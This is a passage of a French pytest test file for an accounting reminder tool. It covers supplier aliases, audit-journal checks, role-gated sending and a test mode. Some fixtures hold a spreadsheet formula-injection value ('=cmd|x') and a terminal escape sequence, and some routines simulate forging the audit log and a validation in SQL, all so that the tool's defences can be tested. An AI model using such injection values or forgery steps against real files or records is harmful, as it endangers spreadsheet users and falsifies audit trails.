    entree = _entree_amazon(tmp_path / "e", "alias,fournisseur\namzn mktplace,Amazon EU Sarl\n"
                                            "amzn mktplace,Garage Dupont\n")
    with pytest.raises(cycle.ErreurFormat, match="alias_fournisseurs.csv.*deux fournisseurs"):
        cycle.lire_entrees(entree)


def test_a15_le_meme_alias_ne_justifie_pas_un_autre_fournisseur(tmp_path):
    """L'alias ne vaut que pour SON fournisseur : une piece d'un autre fournisseur n'est pas
    appariee a cause de lui (sinon un manque serait masque)."""
    entree = ecrire_entree(tmp_path / "e", operations=[["ALPHA", "2026-09-10", "CB AMZN MKTPLACE 4471", "89.90", "A-AMZ"]],
                           pieces=[["P-1", "ALPHA", "autre.pdf", "Garage Dupont", "2026-09-09", "89.90", "EUR",
                                    "2026-09-11", "email"]])
    (entree / "alias_fournisseurs.csv").write_text("alias,fournisseur\namzn mktplace,Amazon EU Sarl\n", encoding="utf-8")
    r = lancer(entree, nouvelle_instance(tmp_path / "i"), J0)
    assert r.pieces_creees + r.a_verifier == 1                              # jamais "justifie"


# --- A10 : regle et motif dans l'audit de creation ---------------------------


def test_a10_piece_creee_explique_la_regle_et_le_motif(entree, inst):
    lancer(entree, inst, J0)
    creees = [e for e in JournalAudit(inst.audit).lire() if e.action == "piece_creee"]
    assert len(creees) == 5
    for e in creees:
        assert e.details["regle"] == "aucun_candidat"
        assert e.details["motif"] == "Aucune piece justificative recue pour ce paiement"
    assert {e.objet for e in creees} == {f"{('ALPHA' if r[0] == 'A' else 'BETA' if r[0] == 'B' else 'GAMMA')}/{r}"
                                         for r in ("A-001", "A-002", "A-003", "B-001")} | {"GAMMA/G-001"} \
        or len({e.objet for e in creees}) == 5


# --- A8 : contexte de la file humaine ----------------------------------------


def _decision(detail: str) -> cycle.DecisionRoutage:
    return cycle.DecisionRoutage("<m@x>", "f.pdf", "abc", StatutRoutage.NON_ROUTEE, detail=detail)


def test_a8_le_contexte_du_message_est_conserve_dans_le_detail(entree, inst, capsys):
    ecrire_eml(inst.entrant, "1.eml", expediteur="Jean <jean@inconnu-sarl.fr>", message_id="<ctx@x>",
               objet="Facture 12,00 EUR  de\x1b[2Jjuin", corps="voir PJ", fichiers=(("f.pdf", b"%PDF-c"),))
    lancer(entree, inst, J0)
    (d,) = cycle.lister_file(inst)
    ctx = cycle.contexte_file(d)
    assert set(ctx) == {"raison", "expediteur", "recu_le", "objet"}
    assert ctx["expediteur"] == "jean@inconnu-sarl.fr" and ctx["recu_le"] == "2026-10-07T09:00:00+02:00"
    assert ctx["objet"].startswith("Facture 12,00 EUR de") and "inconnu" in ctx["raison"]
    assert json.loads(d.detail) == ctx                                       # JSON dans detail, schema inchange
    ligne = lire_csv(inst.sortie / "file_humaine.csv")[0]
    assert (ligne["expediteur"], ligne["recu_le"], ligne["detail"]) == (
        "jean@inconnu-sarl.fr", "2026-10-07T09:00:00+02:00", ctx["raison"])
    rc, out, _ = cli(capsys, inst, "file")
    assert rc == 0 and "[de jean@inconnu-sarl.fr le 2026-10-07T09:00:00+02:00 : Facture 12,00 EUR de" in out
    assert "\x1b" not in out and "\\x1b" in out                              # affichable
    lancer(entree, inst, J0)                                                 # rejeu : rien de duplique
    assert len(cycle.lister_file(inst)) == 1


def test_a8_contexte_pour_chaque_cas_non_route(entree, inst):
    ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@gmail.com", message_id="<a@x>", objet="sans PJ")
    ecrire_eml(inst.entrant, "2.eml", expediteur=ORIGINE, message_id="<b@x>", objet="x" * 900, corps="9,99 EUR",
               fichiers=(("f.pdf", b"%PDF-b"),))
    lancer(entree, inst, J0)
    contextes = [cycle.contexte_file(d) for d in cycle.lister_file(inst)]
    assert len(contextes) == 2 and all(set(c) == {"raison", "expediteur", "recu_le", "objet"} for c in contextes)
    assert {c["expediteur"] for c in contextes} == {"inconnu@gmail.com", ORIGINE}
    assert max(len(c["objet"]) for c in contextes) == cycle.LONGUEUR_MAX_OBJET


@pytest.mark.parametrize("detail, attendu", [
    ("adresse x@y.fr et domaine y.fr inconnus", {"raison": "adresse x@y.fr et domaine y.fr inconnus"}),
    ("", {"raison": ""}),
    ("123", {"raison": "123"}),                                              # JSON valide mais pas un objet
    ('["a", "b"]', {"raison": '["a", "b"]'}),
    ("{pas du json", {"raison": "{pas du json"}),
    ('{"raison": 5}', {"raison": '{"raison": 5}'}),                          # raison non textuelle
    ('{"expediteur": "a@b.fr"}', {"expediteur": "a@b.fr", "raison": ""}),    # JSON partiel
    ('{"raison": "r", "expediteur": "a@b.fr", "recu_le": "2026-10-01", "objet": "o", "autre": [1]}',
     {"raison": "r", "expediteur": "a@b.fr", "recu_le": "2026-10-01", "objet": "o"}),
])
def test_a8_contexte_file_tolerant_aux_anciens_detail(detail, attendu):
    assert cycle.contexte_file(_decision(detail)) == attendu


# --- Envoi nominatif -----------------------------------------------------------


def _entrees_audit(inst: cycle.Instance, action: str):
    return [e for e in JournalAudit(inst.audit).lire() if e.action == action]


def _valider_premier(inst: cycle.Instance, entree: Path, par: str = VALIDEUSE, jour_: dt.date = J0) -> Brouillon:
    lancer(entree, inst, jour_)
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    cycle.valider_relance(inst, b.id_relance, par, maintenant=a_10h(jour_))
    return b


def test_envoi_nominatif_envoye_par_dans_le_journal(entree, inst):
    b = _valider_premier(inst, entree)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), par="paul MARTIN")
    (effectue,) = _entrees_audit(inst, "envoi_effectue")
    assert effectue.details["envoye_par"] == "Paul Martin"                   # nom tel que declare
    assert effectue.details["valide_par"] == VALIDEUSE                       # valider et envoyer : deux personnes
    (demarre,) = _entrees_audit(inst, "envoi_demarre")
    assert demarre.details["envoye_par"] == "Paul Martin"
    assert JournalAudit(inst.audit).verifier().ok


def test_envoi_sans_par_garde_son_comportement_et_journalise_null(entree, inst):
    b = _valider_premier(inst, entree)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    (effectue,) = _entrees_audit(inst, "envoi_effectue")
    assert "envoye_par" in effectue.details and effectue.details["envoye_par"] is None


def test_envoi_par_inconnu_refuse_avant_tout_effet(entree, inst):
    b = _valider_premier(inst, entree)
    avant = etat_depot(inst)
    for par in ("Mallory", "  ", "systeme"):
        with pytest.raises(cycle.ValidateurRefuse):
            cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), par=par)
    assert etat_depot(inst) == avant and emls(inst) == []
    assert cycle.brouillons(inst, StatutBrouillon.VALIDEE)[0].id_relance == b.id_relance


# --- A17 : controler-envois (recette de CA-06) ---------------------------------


def _reecrire_journal(inst: cycle.Instance, transformer) -> None:
    """Reecrit tout le journal par l'API (chaine de hachage RECALCULEE, donc valide) en
    appliquant `transformer(entree) -> (acteur, details) | None` (None : entree supprimee).
    Simule un falsificateur qui connait le format : la chaine seule ne le trahit pas."""
    entrees = JournalAudit(inst.audit).lire()
    inst.audit.unlink()
    journal = JournalAudit(inst.audit)
    for e in entrees:
        resultat = transformer(e)
        if resultat is not None:
            acteur, details = resultat
            journal.ecrire(acteur, e.action, e.objet, details, horodatage=dt.datetime.fromisoformat(e.horodatage))
    assert journal.verifier().ok


def _envoi_sain(inst: cycle.Instance, entree: Path) -> Brouillon:
    b = _valider_premier(inst, entree)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), par="Paul Martin")
    return b


def test_a17_journal_sain_aucune_anomalie(entree, inst, capsys):
    b = _envoi_sain(inst, entree)
    controle = cycle.controler_envois(inst)
    assert controle.ok and controle.chaine_ok and controle.nb_anomalies == 0
    (ligne,) = controle.lignes
    assert (ligne.id_relance, ligne.destinataire, ligne.valide_par, ligne.envoye_par, ligne.nature) == (
        b.id_relance, ORIGINE, VALIDEUSE, "Paul Martin", "effectue")
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 0 and b.id_relance in out and "Marie Durand" in out and "Paul Martin" in out
    assert out.splitlines()[0].split()[:3] == ["brouillon", "valide", "par"] and "1 envoi(s) controle(s), 0 anomalie(s)" in out
    assert "chaine du journal : saine" in out
    avant = inst.audit.read_bytes()
    cycle.controler_envois(inst)
    assert inst.audit.read_bytes() == avant                                   # lecture seule


def test_a17_journal_sans_aucun_envoi_ni_fichier(entree, inst, tmp_path):
    lancer(entree, inst, J0)
    assert cycle.controler_envois(inst).ok and cycle.controler_envois(inst).lignes == ()
    vide = cycle.Instance(tmp_path / "vide")
    controle = cycle.controler_envois(vide)
    assert not controle.ok and "absent" in controle.raison_chaine and not vide.racine.exists()


def test_a17_entree_valide_retiree_a_la_main_chaine_rompue(entree, inst, capsys):
    _envoi_sain(inst, entree)
    lignes = inst.audit.read_bytes().split(b"\n")
    index = next(i for i, l in enumerate(lignes) if b'"action":"valide"' in l)
    del lignes[index]
    inst.audit.write_bytes(b"\n".join(lignes))
    controle = cycle.controler_envois(inst)
    assert not controle.ok and not controle.chaine_ok
    assert any("aucune entree `valide` anterieure" in a for l in controle.lignes for a in l.anomalies)
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 1 and "NON SAINE" in out and "ANOMALIE" in out


def test_a17_entree_valide_supprimee_avec_chaine_recalculee(entree, inst, capsys):
    """Falsificateur habile : la chaine de hachage est refaite, seule la semantique le trahit."""
    _envoi_sain(inst, entree)
    _reecrire_journal(inst, lambda e: None if e.action == "valide" else (e.acteur, e.details))
    assert cycle.verifier_audit(inst).ok                                      # verifier-audit ne voit rien
    controle = cycle.controler_envois(inst)
    assert controle.chaine_ok and not controle.ok
    assert controle.lignes[0].anomalies == ("aucune entree `valide` anterieure pour ce brouillon",)
    rc, out, _ = cli(capsys, inst, "controler-envois")
    # 1 anomalie sur la ligne + 1 ecart : la base montre un brouillon ENVOYEE sans `valide` au journal.
    assert rc == 1 and "1 envoi(s) controle(s), 2 anomalie(s)" in out
    assert f"ECART : brouillon {controle.lignes[0].id_relance} ENVOYEE en base sans entree valide" in out


@pytest.mark.parametrize("falsification, attendu", [
    ("validateur_inconnu", "absent de validateurs.txt et responsables.txt"),
    ("destinataire_change", "destinataire valide"),
    ("valide_apres_envoi", "aucune entree `valide` anterieure"),
    ("valide_par_different", "`valide_par` de l'envoi"),
    ("envoyeur_inconnu", "envoye par 'Mallory'"),
])
def test_a17_falsifications_semantiques_detectees(entree, inst, falsification, attendu):
    _envoi_sain(inst, entree)

    def transformer(e):
        d = dict(e.details)
        if falsification == "validateur_inconnu" and e.action == "valide":
            d["par"] = "Mallory"
            return "Mallory", d
        if falsification == "destinataire_change" and e.action == "valide":
            d["destinataire"] = "autre@client.fr"
        if falsification == "valide_par_different" and e.action == "envoi_effectue":
            d["valide_par"] = "Paul Martin"
        if falsification == "envoyeur_inconnu" and e.action == "envoi_effectue":
            d["envoye_par"] = "Mallory"
        return e.acteur, d

    if falsification == "valide_apres_envoi":                               # la validation date d'apres l'envoi
        entrees = JournalAudit(inst.audit).lire()
        ordre = [e for e in entrees if e.action != "valide"]
        ordre.insert(next(i for i, e in enumerate(ordre) if e.action == "envoi_effectue") + 1,
                     next(e for e in entrees if e.action == "valide"))
        inst.audit.unlink()
        j = JournalAudit(inst.audit)
        for e in ordre:
            j.ecrire(e.acteur, e.action, e.objet, e.details, horodatage=dt.datetime.fromisoformat(e.horodatage))
    else:
        _reecrire_journal(inst, transformer)
    controle = cycle.controler_envois(inst)
    assert controle.chaine_ok and not controle.ok
    assert any(attendu in a for a in controle.lignes[0].anomalies), controle.lignes[0].anomalies


def test_a17_validation_forgee_en_sql_puis_envoi_detectee(entree, inst, capsys):
    """L'attaque du xfail S4 : statut `validee` et `valide_par` ecrits en SQL, sans entree `valide`.
    `envoyer` part (limite assumee) mais la recette de CA-06 la trahit."""
    import sqlite3
    lancer(entree, inst, J0)
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    with sqlite3.connect(inst.depot) as c:
        c.execute("UPDATE brouillons SET statut='validee', valide_par='Marie Durand', valide_le=? "
                  "WHERE id_relance=?", (a_10h(J0).isoformat(), b.id_relance))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), par="Paul Martin")
    rc, out, _ = cli(capsys, inst, "controler-envois")
    assert rc == 1 and "aucune entree `valide` anterieure" in out


def test_a17_brouillon_envoye_deux_fois_et_envoi_confirme_par_un_humain(entree, inst):
    b = _envoi_sain(inst, entree)
    envoi = next(e for e in JournalAudit(inst.audit).lire() if e.action == "envoi_effectue")
    journal = JournalAudit(inst.audit)
    journal.ecrire("systeme", "envoi_effectue", b.id_relance, dict(envoi.details))      # doublon
    controle = cycle.controler_envois(inst)
    assert [l.anomalies for l in controle.lignes] == [("brouillon envoye 2 fois",)] * 2
    # un envoi incertain tranche par un humain est controle comme les autres
    autre = tuple(x for x in cycle.brouillons(inst) if x.id_relance != b.id_relance)[0]
    cycle.valider_relance(inst, autre.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    class Coupure:
        def envoyer(self, brouillon):
            raise TimeoutError("muet")

    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, autre.id_relance, maintenant=a_10h(J0 + dt.timedelta(days=1)),
                              expediteur=Coupure(), par="Paul Martin")
    cycle.trancher_envoi(inst, autre.id_relance, RESPONSABLE, parti=True, maintenant=a_10h(J0 + dt.timedelta(days=1)))
    natures = {l.id_relance: l.nature for l in cycle.controler_envois(inst).lignes}
    assert natures[autre.id_relance] == "confirme"
    assert next(l for l in cycle.controler_envois(inst).lignes if l.id_relance == autre.id_relance).anomalies == ()


# --- Mode test : creneau libre et limite hebdomadaire -------------------------------

NUIT = dt.datetime.combine(J0, dt.time(23, 30), tzinfo=PARIS)
SAMEDI = dt.datetime.combine(dt.date(2026, 10, 10), dt.time(10, 0), tzinfo=PARIS)


def test_mode_test_creneau_libre_par_defaut_envoi_de_nuit_accepte(entree, inst):
    ecrire_config(inst, mode_test=True)
    b = _valider_premier(inst, entree)
    envoye = cycle.envoyer_relance(inst, b.id_relance, maintenant=NUIT, par=VALIDEUSE)
    assert envoye.statut is StatutBrouillon.ENVOYEE
    (coupes,) = _entrees_audit(inst, "garde_fous_coupes")                     # une fois par commande
    assert coupes.details["garde_fous"] == ["creneau d'envoi libre (heures et jours ouvres ignores)"]
    assert coupes.details["envoye_par"] == VALIDEUSE
    assert cycle.garde_fous_mode_test(inst) == tuple(coupes.details["garde_fous"])


def test_hors_mode_test_le_creneau_reste_applique_quoi_que_dise_config(entree, inst):
    ecrire_config(inst, mode_test=False, creneau_envoi_libre=True, limite_hebdomadaire=False)
    b = _valider_premier(inst, entree)
    with pytest.raises(envoi.EnvoiHorsCreneau):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=NUIT)
    with pytest.raises(envoi.EnvoiHorsCreneau):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=SAMEDI)
    assert cycle.garde_fous_mode_test(inst) == () and "garde_fous_coupes" not in actions_audit(inst)
    assert cycle.brouillons(inst, StatutBrouillon.VALIDEE) and emls(inst) == []


def test_mode_test_creneau_envoi_libre_faux_rend_le_creneau(entree, inst):
    ecrire_config(inst, mode_test=True, creneau_envoi_libre=False)
    b = _valider_premier(inst, entree)
    with pytest.raises(envoi.EnvoiHorsCreneau):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=NUIT)
    assert cycle.garde_fous_mode_test(inst) == ()
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))


def _deux_brouillons_meme_destinataire(inst: cycle.Instance, entree: Path):
    b1 = _valider_premier(inst, entree)
    b2 = Brouillon(identifiant_relance(ORIGINE, ("A-002",), 1, J0), ORIGINE, "Autre", "x", ("ALPHA",),
                   ("A-002",), 1, J0)
    with Depot(inst.depot) as d:
        d.sauver_brouillon(b2)
    cycle.valider_relance(inst, b2.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    return b1, b2


def test_mode_test_limite_hebdomadaire_active_par_defaut(entree, inst):
    ecrire_config(inst, mode_test=True)
    b1, b2 = _deux_brouillons_meme_destinataire(inst, entree)
    cycle.envoyer_relance(inst, b1.id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.EnvoiRefuse, match="un e-mail par 7 jours"):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a_10h(jour(1)))


def test_mode_test_limite_hebdomadaire_coupee_journalisee_et_affichee(entree, inst, capsys):
    ecrire_config(inst, mode_test=True, limite_hebdomadaire=False)
    b1, b2 = _deux_brouillons_meme_destinataire(inst, entree)
    cycle.envoyer_relance(inst, b1.id_relance, maintenant=a_10h(J0))
    rc, out, _ = cli(capsys, inst, "envoyer", b2.id_relance, "--par", VALIDEUSE, date=jour(1))
    assert rc == 0 and "GARDE-FOU DESACTIVE (mode test) : limite hebdomadaire ignoree" in out
    assert len(emls(inst)) == 2
    assert [e.details["garde_fous"] for e in _entrees_audit(inst, "garde_fous_coupes")] == [
        ["creneau d'envoi libre (heures et jours ouvres ignores)",
         "limite hebdomadaire ignoree (plusieurs e-mails par semaine au meme destinataire)"]] * 2
    assert len(_entrees_audit(inst, "limite_hebdomadaire_ignoree")) >= 1         # trace d'envoi.py aussi
    # Le bandeau du cycle les annonce.
    r = lancer(entree, inst, jour(2))
    assert r.garde_fous_coupes == list(cycle.garde_fous_mode_test(inst))
    lignes = r.texte().splitlines()
    assert "GARDE-FOU DESACTIVE (mode test) : limite hebdomadaire ignoree (plusieurs e-mails par semaine " \
           "au meme destinataire)" in lignes
    assert lignes[0].startswith("*** MODE TEST ACTIF")
    assert "GARDE-FOU DESACTIVE (mode test) : creneau d'envoi libre (heures et jours ouvres ignores)" in \
        (inst.sortie / "resume.txt").read_text().splitlines()


@pytest.mark.parametrize("cle", ["creneau_envoi_libre", "limite_hebdomadaire"])
def test_config_garde_fous_doivent_etre_booleens(inst, cle):
    ecrire_config(inst, mode_test=True, **{cle: "false"})
    with pytest.raises(cycle.ConfigInvalide, match=cle):
        cycle.charger_config(inst)
    ecrire_config(inst, mode_test=True)
    assert cle not in cycle.charger_config(inst)                               # defauts non injectes


# --- Regles d'exclusion provisoires (statut `proposee`) --------------------------------------


def _entree_avec_regles(rep: Path) -> Path:
    entree = ecrire_entree(rep)
    (entree / "exclusions_dossier.csv").write_text(
        "dossier,motif_regex,motif,nom,auteur,date_activation,statut\n"
        "ALPHA,loxam,Location refacturee,regle-loxam,Claire,2026-10-01,proposee\n"
        "ALPHA,=cmd|x,Piege tableur,=regle-piegee,Mallory,2026-10-02,proposee\n"
        "BETA,metro,Achats revendus,regle-metro,Claire,2026-10-01,validee\n", encoding="utf-8")
    return entree


def test_regles_provisoires_comptees_listees_jamais_appliquees(tmp_path):
    entree = _entree_avec_regles(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "i")
    r = lancer(entree, inst, J0)
    assert r.regles_provisoires == ["regle-loxam", "=regle-piegee"]
    ligne = "  regles provisoires          : 2 en attente de validation (regle-loxam, =regle-piegee)"
    assert ligne in r.texte().splitlines() and ligne in (inst.sortie / "resume.txt").read_text().splitlines()
    pieces = pieces_par_ref(inst)
    assert pieces["A-001"].etat is EtatPiece.ATTENDUE                        # `proposee` : A-001 reste reclamee
    assert "B-001" not in pieces                                              # `validee` : B-001 exclue
    lignes = lire_csv(inst.sortie / "regles_provisoires.csv")
    assert [(l["dossier"], l["nom"], l["auteur"], l["date_activation"]) for l in lignes] == [
        ("ALPHA", "=regle-piegee".replace("=", "'="), "Mallory", "2026-10-02"),
        ("ALPHA", "regle-loxam", "Claire", "2026-10-01")]
    assert _cellules_dangereuses(inst.sortie / "regles_provisoires.csv") == []   # ligne_sure
    assert [c["motif_regex"] for c in lignes] == ["'=cmd|x", "loxam"]
    cd = [e for e in JournalAudit(inst.audit).lire() if e.action == "cycle_termine"][-1].details
    assert cd["regles_provisoires"] == 2


def test_sans_regle_provisoire_aucune_ligne_et_csv_vide(entree, inst):
    r = lancer(entree, inst, J0)
    assert r.regles_provisoires == [] and "regles provisoires" not in r.texte()
    assert (inst.sortie / "regles_provisoires.csv").read_text(encoding="utf-8").splitlines() == [
        "dossier,nom,motif_regex,motif,auteur,date_activation"]



# --- Forcer un rattachement inter-dossiers : reserve au RESPONSABLE (cahier v1.1, section 7, regle 7) ---


def test_forcer_par_un_simple_validateur_refuse_sans_effet_et_avant_le_motif(entree, inst):
    d = _proposition_alpha(inst, entree)
    avant, journal_avant = etat_depot(inst), actions_audit(inst)
    for motif in ("verifie par telephone", "", None):                  # le role est controle AVANT le motif
        with pytest.raises(cycle.ValidateurRefuse, match=r"n'est pas dans responsables\.txt"):
            cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                                  dossier="BETA", reference="B-001", forcer=True, motif=motif)
    with pytest.raises(cycle.ValidateurRefuse):                        # meme sans decision de routage
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), dossier="BETA",
                              reference="B-001", id_piece="P", forcer=True, motif="x")
    assert etat_depot(inst) == avant and actions_audit(inst) == journal_avant      # aucune ecriture, aucun journal
    assert "rattachement_force" not in actions_audit(inst)
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE and cycle.lister_file(inst)


def test_forcer_responsable_sans_motif_refuse_puis_avec_motif_accepte(entree, inst):
    d = _proposition_alpha(inst, entree)
    with pytest.raises(cycle.ErreurCycle, match="--forcer exige un --motif non vide"):
        cycle.rattacher_piece(inst, RESPONSABLE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001", forcer=True, motif=" ")
    p = cycle.rattacher_piece(inst, "paul MARTIN", maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001", forcer=True, motif="verifie par telephone")
    assert p.etat is EtatPiece.RECUE
    (force,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "rattachement_force"]
    assert force.acteur == RESPONSABLE and force.details["motif"] == "verifie par telephone"


def test_rattachement_normal_reste_ouvert_a_un_simple_validateur(entree, inst):
    d = _proposition_alpha(inst, entree)
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="ALPHA", reference="A-001")
    assert (p.dossier, p.etat) == ("ALPHA", EtatPiece.RECUE)
    assert "rattachement_force" not in actions_audit(inst)


def test_forcer_sans_responsables_txt_refuse_hors_mode_test_meme_pour_un_validateur(entree, inst):
    d = _proposition_alpha(inst, entree)
    inst.responsables.unlink()
    avant = etat_depot(inst)
    for par in (VALIDEUSE, RESPONSABLE):
        with pytest.raises(cycle.ValidateurRefuse, match=r"responsables\.txt est absent"):
            cycle.rattacher_piece(inst, par, maintenant=a_10h(jour(1)), message_id=d.message_id,
                                  dossier="BETA", reference="B-001", forcer=True, motif="x")
    assert etat_depot(inst) == avant and "rattachement_force" not in actions_audit(inst)
    # et le rattachement normal n'a besoin d'aucun responsable
    assert cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id).etat is EtatPiece.RECUE


def test_forcer_en_mode_test_sans_responsables_txt_repli_annonce_et_journalise(entree, inst, capsys):
    ecrire_config(inst, mode_test=True)          # instance de test des le premier cycle (mode fige)
    d = _proposition_alpha(inst, entree)
    inst.responsables.unlink()
    with pytest.raises(cycle.ValidateurRefuse, match="Mallory"):
        cycle.rattacher_piece(inst, "Mallory", maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001", forcer=True, motif="x", mode_test=True)
    ecrire_config(inst, mode_test=True)                                 # config.json suffit aussi
    rc, out, _ = cli(capsys, inst, "rattacher", "--message-id", d.message_id, "--par", VALIDEUSE,
                     "--dossier", "BETA", "--reference", "B-001", "--forcer", "--motif", "verifie", date=jour(1))
    assert rc == 0 and "AVERTISSEMENT : responsables.txt absent" in out and "BETA/B-001 -> recue" in out
    (repli,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "repli_roles_mode_test"]
    assert repli.acteur == VALIDEUSE and repli.objet == "rattacher --forcer"
    assert "rattachement_force" in actions_audit(inst)


def test_cli_forcer_par_un_simple_validateur_refuse(entree, inst, capsys):
    d = _proposition_alpha(inst, entree)
    rc, _, err = cli(capsys, inst, "rattacher", "--message-id", d.message_id, "--par", VALIDEUSE,
                     "--dossier", "BETA", "--reference", "B-001", "--forcer", "--motif", "verifie", date=jour(1))
    assert rc == 1 and "REFUS (ValidateurRefuse)" in err and "responsables.txt" in err
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE and "rattachement_force" not in actions_audit(inst)


def test_cli_forcer_option_mode_test_suffit_au_repli(entree, inst, capsys):
    d = _proposition_alpha(inst, entree, mode_test=True)         # instance de test, creee par le drapeau
    inst.responsables.unlink()
    args = ["--message-id", d.message_id, "--par", VALIDEUSE, "--dossier", "BETA", "--reference", "B-001",
            "--forcer", "--motif", "verifie"]
    rc, _, err = cli(capsys, inst, "rattacher", *args, date=jour(1))     # sans le drapeau : mode fige = test
    assert rc == 1 and "creee en mode test" in err
    rc, out, _ = cli(capsys, inst, "rattacher", *args, "--mode-test", date=jour(1))
    assert rc == 0 and "AVERTISSEMENT : responsables.txt absent" in out


# ---------------------------------------------------------------------------
# Quatrieme passage de revue : mode FIGE par instance, proprietaire d'une piece, recoupement base /
# journal / outbox, noms NFC. Chaque garde est verifiee par mutation (voir le rapport).
# ---------------------------------------------------------------------------

import dataclasses as _dc  # noqa: E402
import sqlite3  # noqa: E402
import unicodedata  # noqa: E402


# --- Le mode (test ou reel) est une propriete de l'instance ----------------------------------


def _instance_figee(tmp_path: Path, entree: Path, cree_en: str, nom: str = "figee"):
    """Instance dont le premier cycle a fige le mode `cree_en`, SANS config.json (par le seul
    drapeau, comme `cycle --mode-test`). Renvoie (instance, id d'un brouillon)."""
    inst = nouvelle_instance(tmp_path / nom)
    lancer(entree, inst, J0, mode_test=(cree_en == "test"))
    assert cycle.mode_instance(inst) == cree_en
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    return inst, b.id_relance


def _appeler(nom: str, inst: cycle.Instance, entree: Path, ident: str, mode_test: bool, par: str = RESPONSABLE):
    m = a_10h(J0)
    kw = {"maintenant": m, "mode_test": mode_test}
    if nom == "cycle":
        return cycle.executer_cycle(entree, inst, J0, m, mode_test=mode_test)
    return {
        "valider": lambda: cycle.valider_relance(inst, ident, par, **kw),
        "rejeter": lambda: cycle.rejeter_relance(inst, ident, par, "non", **kw),
        "envoyer": lambda: cycle.envoyer_relance(inst, ident, par=par, **kw),
        "rattacher": lambda: cycle.rattacher_piece(inst, par, dossier="ALPHA", reference="A-001",
                                                   id_piece="P-1", **kw),
        "rattacher_forcer": lambda: cycle.rattacher_piece(inst, par, dossier="ALPHA", reference="A-001",
                                                          id_piece="P-1", forcer=True, motif="x", **kw),
        "controler": lambda: cycle.controler_piece(inst, "ALPHA", "A-001", par, conforme=True, **kw),
        "promesse": lambda: cycle.saisir_promesse(inst, "ALPHA", "A-001", par, date_promesse=jour(3), **kw),
        "arbitrer": lambda: cycle.arbitrer_piece(inst, "ALPHA", "A-001", par, motif="x", **kw),
        "bloquer": lambda: cycle.bloquer_piece(inst, "ALPHA", "A-001", par, motif="x", **kw),
        "debloquer": lambda: cycle.debloquer_piece(inst, "ALPHA", "A-001", par, motif="x", **kw),
        "trancher": lambda: cycle.trancher_envoi(inst, ident, par, parti=True, **kw),
        "reparer": lambda: cycle.reparer_audit(inst, par, **kw),
    }[nom]()


OPERATIONS_A_MODE = ["cycle", "valider", "rejeter", "envoyer", "rattacher", "rattacher_forcer", "controler",
                     "promesse", "arbitrer", "bloquer", "debloquer", "trancher", "reparer"]


def test_le_premier_cycle_fige_le_mode_une_seule_fois(entree, inst):
    assert cycle.mode_instance(inst) is None and cycle.mode_instance(inst.racine / "inexistante") is None
    assert not (inst.racine / "inexistante").exists()                      # lecture seule
    lancer(entree, inst, J0, mode_test=True)
    assert cycle.mode_instance(inst) == "test"
    lancer(entree, inst, jour(1), mode_test=True)
    (figeage,) = _entrees_audit(inst, "mode_instance")                     # une seule fois
    assert figeage.details["mode"] == "test" and figeage.details["source"] == "--mode-test"
    assert figeage.details["pieces_deja_presentes"] == 0 and figeage.acteur == "systeme"
    with sqlite3.connect(inst.depot) as c:                                  # marqueur dans le depot
        assert c.execute("SELECT cle FROM vus WHERE cle LIKE 'mode-instance:%'").fetchall() == [("mode-instance:test",)]
    assert JournalAudit(inst.audit).verifier().ok


@pytest.mark.parametrize("config, drapeau, source", [
    (True, False, "config.json"), (False, True, "--mode-test"), (True, True, "config.json et --mode-test"),
    (False, False, "defaut"),
])
def test_la_source_du_mode_est_journalisee(entree, tmp_path, config, drapeau, source):
    inst = nouvelle_instance(tmp_path / "i")
    if config:
        ecrire_config(inst, mode_test=True)
    lancer(entree, inst, J0, mode_test=drapeau)
    (figeage,) = _entrees_audit(inst, "mode_instance")
    assert figeage.details["source"] == source
    assert figeage.details["mode"] == ("test" if config or drapeau else "reel")


def test_un_cycle_refuse_ne_fige_rien(tmp_path):
    ops = OPERATIONS + [["BETA", "2026-09-12", "CB LEROY MERLIN", "99.00", "A-001"]]       # collision
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    with pytest.raises(cycle.CollisionReferences):
        lancer(entree, inst, J0, mode_test=True)
    assert cycle.mode_instance(inst) is None and "mode_instance" not in actions_audit(inst)
    lancer(ecrire_entree(tmp_path / "ok"), inst, J0)                        # le bon cycle fige, lui
    assert cycle.mode_instance(inst) == "reel"


@pytest.mark.parametrize("nom", OPERATIONS_A_MODE)
@pytest.mark.parametrize("cree_en", ["test", "reel"])
